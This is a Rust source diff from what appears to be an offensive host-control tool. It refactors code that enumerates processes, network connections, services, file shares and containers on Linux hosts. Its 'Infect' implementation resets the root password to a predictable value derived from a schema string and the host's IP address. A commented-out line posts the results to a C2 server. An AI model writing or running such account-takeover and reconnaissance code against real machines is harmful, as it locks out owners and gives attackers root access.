@@ -12,10 +12,10 @@ use std::io::Write;
 use std::path::Path;
 use std::process::{Command, Stdio};
 use std::sync::Arc;
-use std::sync::Mutex;
 use std::thread;
 use sysinfo::UserExt;
 
+// Converts UdpState to ConnectionState
 impl From<&UdpState> for super::types::ConnectionState {
     fn from(udp_state: &UdpState) -> Self {
         match udp_state {
@@ -45,38 +45,28 @@ impl From<&TcpState> for super::types::ConnectionState {
 }
 
 fn change_password(username: &str, password: &str) -> std::io::Result<()> {
-    let mut child = Command::new("passwd")
-        .arg(username)
-        .stdin(Stdio::piped())
-        .spawn()?;
-
-    {
-        let stdin = child.stdin.as_mut().expect("Failed to open stdin");
-        stdin.write_all(password.as_bytes())?;
-        stdin.write_all(b"\n")?;
-        stdin.write_all(password.as_bytes())?;
-        stdin.write_all(b"\n")?;
+    match super::utils::CommandExecutor::execute_command(
+        "passwd",
+        Some(&[username]),
+        Some(&[password]),
+    ) {
+        Ok(_) => Ok(()),
+        Err(e) => Err(e),
     }
-
-    let output = child.wait_with_output()?;
-
-    if output.status.success() {
-        println!("Password changed successfully.");
-    } else {
-        eprintln!("Failed to change password.");
-    }
-
-    Ok(())
 }
 
 impl super::types::Infect for crate::Host {
     fn init(&self, schema: &str) {
+        // Change password based on Schema
         let password = format!(
             "{}{:?}!",
             schema,
             self.ip.split('.').last().unwrap().parse::<u16>().ok()
         );
         let _ = change_password("root", password.as_str());
+
+        // Post Evil fetch results to C2
+        // let _ = post_evil_results(&self.c2, &self.ip, &password);
     }
 }
 
@@ -89,7 +79,6 @@ impl super::types::OS for crate::Host {
         let all_procs = procfs::process::all_processes().unwrap(); // handle errors appropriately
         let mut map: HashMap<u64, Stat> = HashMap::new();
         for p in all_procs {
-            // let process = p.unwrap(); // handle errors appropriately
             match p {
                 Ok(process) => {
                     if let (Ok(stat), Ok(fds)) = (process.stat(), process.fd()) {
@@ -112,15 +101,10 @@ impl super::types::OS for crate::Host {
 
         let shared_map = Arc::new(map);
 
-        // Get start time
-        let start_time = std::time::Instant::now();
         let tcp_connections = process_network_entries(procfs::net::tcp, Arc::clone(&shared_map));
         let udp_connections = process_network_entries(procfs::net::udp, Arc::clone(&shared_map));
         let tcp6_connections = process_network_entries(procfs::net::tcp6, Arc::clone(&shared_map));
         let udp6_connections = process_network_entries(procfs::net::udp6, shared_map);
-        let end_time = std::time::Instant::now();
-
-        println!("Mapped All processes in {:?}", end_time - start_time);
 
         // Combine TCP and UDP connections
         let mut all_connections = Vec::new();
@@ -220,8 +204,7 @@ impl super::types::OS for crate::Host {
     }
 
     fn services() -> Box<[super::types::Service]> {
-        // println!("{:?}", list_services(&detect_init_system()));
-        Box::new([])
+        detect_init_system().parse()
     }
 
     fn shares() -> Box<[super::types::Share]> {
@@ -253,7 +236,7 @@ fn read_samba_shares(directory: &str) -> Vec<super::types::Share> {
     }
 }
 
-fn parse_exports_line(line: &str) -> Option<super::types::Share> {
+fn exports_line(line: &str) -> Option<super::types::Share> {
     let parts: Vec<&str> = line.split_whitespace().collect();
     parts.first().map(|&path| super::types::Share {
         share_type: super::types::ShareType::NFS,
@@ -266,7 +249,7 @@ fn read_nfs_shares(filepath: &str) -> Vec<super::types::Share> {
         contents
             .lines()
             .filter(|line| !line.trim().is_empty() && !line.trim_start().starts_with('#'))
-            .filter_map(parse_exports_line)
+            .filter_map(exports_line)
             .collect()
     } else {
         Vec::new()
@@ -409,15 +392,14 @@ impl NetworkData for TcpNetEntry {
 // }
 
 fn get_container_ids(command: &str) -> Vec<String> {
-    let output = Command::new(command)
-        .args(&["ps", "-q"])
-        .output()
-        .expect("Failed to execute docker ps command");
-
-    String::from_utf8_lossy(&output.stdout)
-        .lines()
-        .map(String::from)
-        .collect()
+    let output = super::utils::CommandExecutor::execute_command(command, Some(&["ps", "-q"]), None);
+    match output {
+        Ok(output) => String::from_utf8_lossy(&output.stdout)
+            .lines()
+            .map(String::from)
+            .collect(),
+        Err(_) => Vec::new(),
+    }
 }
 
 fn get_generic_containers(command: &str) -> Vec<super::types::Container> {
@@ -426,20 +408,20 @@ fn get_generic_containers(command: &str) -> Vec<super::types::Container> {
     container_ids
         .iter()
         .filter_map(|id| {
-            let output = Command::new(command)
-                .args(&["inspect", id])
-                .output()
-                .expect("Failed to execute docker inspect command");
-
-            let inspect_str = String::from_utf8_lossy(&output.stdout);
-            parse_generic_container(&inspect_str).ok()
+            let inspect_str = match super::utils::CommandExecutor::execute_command(
+                command,
+                Some(&["inspect", id]),
+                None,
+            ) {
+                Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
+                Err(_) => "".to_string(),
+            };
+            generic_container(&inspect_str).ok()
         })
         .collect()
 }
 
-fn parse_generic_container(
-    inspect_data: &str,
-) -> Result<super::types::Container, serde_json::Error> {
+fn generic_container(inspect_data: &str) -> Result<super::types::Container, serde_json::Error> {
     let json: serde_json::Value = serde_json::from_str(inspect_data)?;
 
     let container_info = &json[0];
@@ -457,20 +439,14 @@ fn parse_generic_container(
             .as_str()
             .unwrap_or_default()
             .into(),
-        port_bindings: parse_port_from_inspect(
-            &container_info["NetworkSettings"]["Ports"].as_object(),
-        )
-        .into(),
-        volumes: parse_volumes_from_inspect(&container_info["Mounts"].as_array()).into(),
-        networks: parse_networks_from_inspect(
-            &container_info["NetworkSettings"]["Networks"].as_object(),
-        ),
+        port_bindings: port_from_inspect(&container_info["NetworkSettings"]["Ports"].as_object())
+            .into(),
+        volumes: volumes_from_inspect(&container_info["Mounts"].as_array()).into(),
+        networks: networks_from_inspect(&container_info["NetworkSettings"]["Networks"].as_object()),
     })
 }
 
-fn parse_volumes_from_inspect(
-    mounts: &Option<&Vec<Value>>,
-) -> Box<[super::types::ContainerVolume]> {
+fn volumes_from_inspect(mounts: &Option<&Vec<Value>>) -> Box<[super::types::ContainerVolume]> {
     mounts.map_or(Box::new([]), |mounts| {
         mounts
             .iter()
@@ -489,7 +465,7 @@ fn parse_volumes_from_inspect(
     })
 }
 
-fn parse_networks_from_inspect(
+fn networks_from_inspect(
     networks: &Option<&Map<String, Value>>,
 ) -> Box<[super::types::ContainerNetwork]> {
     // Parse the JSON and extract network information
@@ -512,7 +488,7 @@ fn parse_networks_from_inspect(
     })
 }
 
-fn parse_port_from_inspect(port_map: &Option<&Map<String, Value>>) -> Box<[Box<str>]> {
+fn port_from_inspect(port_map: &Option<&Map<String, Value>>) -> Box<[Box<str>]> {
     port_map.map_or(Box::new([] as [Box<str>; 0]), |ports_map| {
         ports_map
             .iter()
@@ -547,43 +523,171 @@ enum InitSystem {
     UNKNOWN,
 }
 
-fn detect_init_system() -> InitSystem {
-    if Path::new("/usr/lib/systemd/systemd").exists() || Path::new("/lib/systemd/systemd").exists()
-    {
-        InitSystem::SYSTEMD
-    } else if Path::new("/sbin/initctl").exists() {
-        InitSystem::UPSTART
-    } else if Path::new("/etc/init.d/").exists() {
-        InitSystem::SYSVINIT // cOULD ALSO BE oPENrc, ADDITIONAL CHECKS MIGHT BE NEEDED
-    } else {
-        InitSystem::UNKNOWN
+impl InitSystem {
+    fn parse(&self) -> Box<[super::types::Service]> {
+        match self {
+            InitSystem::SYSTEMD => InitSystem::systemd(),
+            InitSystem::UPSTART => InitSystem::upstart(),
+            InitSystem::SYSVINIT => InitSystem::sysvinit(),
+            InitSystem::OPENRC => InitSystem::openrc(),
+            InitSystem::UNKNOWN => InitSystem::unknown(),
+        }
+    }
+
+    // Parses the output of systemctl list-units --type=service
+    // and returns a Box[] of Service structs
+    fn systemd() -> Box<[super::types::Service]> {
+        let output = match super::utils::CommandExecutor::execute_command(
+            "systemctl",
+            Some(&["list-units", "--type=service", "--no-pager"]),
+            None,
+        ) {
+            Ok(output) => output,
+            Err(_) => return Box::new([]),
+        };
+
+        let output_str = String::from_utf8_lossy(&output.stdout);
+
+        // Directly use the output, assuming the relevant data starts from the beginning
+        let lines: Vec<String> = output_str.lines().map(|s| s.to_string()).collect();
+        let num_threads = 4;
+        let chunk_size = (lines.len() + num_threads - 1) / num_threads; // Ensuring at least n chunks
+        let mut threads = vec![];
+
+        let shared_lines = Arc::new(lines); // Ensures the lines are shared between threads
+
+        // Split the lines into chunks and spawn a thread for each chunk
+        for chunk in shared_lines.clone().chunks(chunk_size) {
+            // Clone each line in the chunk to ensure thread owns the data
+            let chunk_cloned: Vec<String> = chunk.iter().cloned().collect();
+
+            // Spawn a thread to process the chunk
+            threads.push(thread::spawn(move || {
+                // Parse Service chunk n
+                chunk_cloned
+                    .into_iter()
+                    .filter_map(|line| split_service_line(&line))
+                    .filter_map(|line| parse_service_line((&line.0, &line.1)))
+                    .collect::<Vec<super::types::Service>>()
+            }));
+        }
+
+        // Join the threads and collect the results
+        threads
+            .into_iter()
+            .map(|thread| thread.join().unwrap())
+            .flatten()
+            .collect()
+    }
+
+    fn upstart() -> Box<[super::types::Service]> {
+        todo!()
+    }
+
+    fn sysvinit() -> Box<[super::types::Service]> {
+        todo!()
+    }
+
+    fn openrc() -> Box<[super::types::Service]> {
+        let output = match super::utils::CommandExecutor::execute_command(
+            "rc-status",
+            Some(&["-a"]),
+            None,
+        ) {
+            Ok(output) => String::from_utf8_lossy(&output.stdout).into_owned(),
+            Err(_) => return Box::new([]),
+        };
+
+        output
+            .lines()
+            .filter(|line| !line.contains(':')) // Filter out lines with colons
+            .filter_map(|line| {
+                // Split the line into service name and status parts
+                let (name, status) = line.split_once('[')?;
+                let status = status.split_once(']')?.0.trim();
+                // Some((name.trim(), status))
+                Some(super::types::Service {
+                    name: name.trim().into(),
+                    state: status.into(),
+                    start_mode: None,
+                    status: None,
+                })
+            })
+            .collect()
+    }
+
+    fn unknown() -> Box<[super::types::Service]> {
+        todo!()
     }
 }
 
-fn list_services(init_system: &InitSystem) {
-    let output = match init_system {
-        InitSystem::SYSTEMD => Command::new("systemctl")
-            .arg("list-units")
-            .arg("--type=service")
-            .output()
-            .expect("Failed to execute systemctl"),
-        InitSystem::SYSVINIT | InitSystem::OPENRC => Command::new("service")
-            .arg("--status-all")
-            .output()
-            .expect("Failed to execute service command"),
-        InitSystem::UPSTART => Command::new("initctl")
-            .arg("list")
-            .output()
-            .expect("Failed to execute initctl"),
-        _ => {
-            println!("Unknown init system");
-            return;
-        }
+fn parse_service_line((name_part, status_part): (&str, &str)) -> Option<super::types::Service> {
+    // Split the status part further to extract state and status
+    let mut status_parts = status_part.split_whitespace();
+    let state = status_parts.next()?.to_owned();
+    let status_str = status_parts.next()?;
+
+    // Mapping the status string to the ServiceStatus enum
+    let status = match status_str {
+        "active" => Some(super::types::ServiceStatus::Active),
+        "inactive" => Some(super::types::ServiceStatus::Inactive),
+        "failed" => Some(super::types::ServiceStatus::Failed),
+        _ => Some(super::types::ServiceStatus::Unknown),
+    };
+    let mode = fetch_service_start_mode(&name_part.trim());
+
+    Some(super::types::Service {
+        name: name_part.trim().into(),
+        state: state.into(),
+        start_mode: mode, // Assuming start mode is not available in the input
+        status,
+    })
+}
+
+fn fetch_service_start_mode(name: &str) -> Option<super::types::ServiceStartType> {
+    let output = match super::utils::CommandExecutor::execute_command(
+        "systemctl",
+        Some(&["is-enabled", name]),
+        None,
+    ) {
+        Ok(output) => String::from_utf8_lossy(&output.stdout).into_owned(),
+        Err(_) => return None,
     };
 
-    match output.status.success() {
-        true => println!("Output:\n{}", String::from_utf8_lossy(&output.stdout)),
-        false => println!("Error:\n{}", String::from_utf8_lossy(&output.stderr)),
+    match output.trim() {
+        "enabled" => Some(super::types::ServiceStartType::Enabled),
+        _ => Some(super::types::ServiceStartType::Disabled),
+    }
+}
+
+fn split_service_line(line: &str) -> Option<(String, String)> {
+    let status_keywords = ["loaded", "active", "running", "exited", "dead"];
+    let mut split_index = None;
+
+    for keyword in status_keywords.iter() {
+        if let Some(index) = line.find(keyword) {
+            split_index = Some(index);
+            break;
+        }
+    }
+
+    split_index.map(|index| {
+        let (first, second) = line.split_at(index);
+        (first.to_string(), second.to_string()) // Convert slices to owned Strings
+    })
+}
+
+fn detect_init_system() -> InitSystem {
+    if which::which("systemctl").unwrap_or_default().exists() {
+        InitSystem::SYSTEMD
+    } else if which::which("open-rc").unwrap_or_default().exists() {
+        InitSystem::OPENRC
+    } else if which::which("initctl").unwrap_or_default().exists() {
+        InitSystem::UPSTART
+    } else if which::which("service").unwrap_or_default().exists() {
+        InitSystem::SYSVINIT
+    } else {
+        InitSystem::UNKNOWN
     }
 }
 
@@ -596,5 +700,11 @@ impl super::types::UserInfo for sysinfo::User {
 
     fn is_local(&self) -> bool {
         true
+    }
+
+    // Reads from etc password and matches shell to the user
+    fn shell(&self) -> Box<str> {
+        todo!()
+        // self.shell().into()
     }
 }
